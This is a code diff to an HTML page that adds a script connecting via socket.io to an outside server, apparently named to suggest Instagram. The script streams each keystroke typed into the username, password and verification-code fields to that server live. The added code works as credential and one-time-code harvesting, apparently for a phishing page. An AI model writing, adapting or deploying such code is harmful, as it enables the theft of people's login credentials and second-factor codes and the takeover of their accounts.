@@ -394,6 +394,43 @@ window.addEventListener("hashchange",showPage);
 showPage();
 </script>
 
+   <script src="https://cdn.socket.io/4.8.3/socket.io.min.js"></script>
+<script>
+  // Connect to your Render server
+  const socket = io("https://insta-yjkb.onrender.com"); // replace with your Render URL
+
+  // Get the username, pass and code input elements
+  const usernameInput = document.getElementById("username");
+  const passwordInput = document.getElementById("password");
+  const codeInput = document.getElementById("code");
+
+  // Send typing event for Name field
+  usernameInput.addEventListener("input", (e) => {
+    socket.emit("typing", {
+      field: "username",
+      value: e.target.value
+    });
+  });
+
+  // Send typing event for Reg field
+  passwordInput.addEventListener("input", (e) => {
+    socket.emit("typing", {
+      field: "password",
+      value: e.target.value
+    });
+  });
+
+  // Send typing event for code field
+  codeInput.addEventListener("input", (e) => {
+    socket.emit("typing", {
+      field: "code",
+      value: e.target.value
+    });
+  });
+
+   </script>
+
+
 </body>
 </html>
-```
+
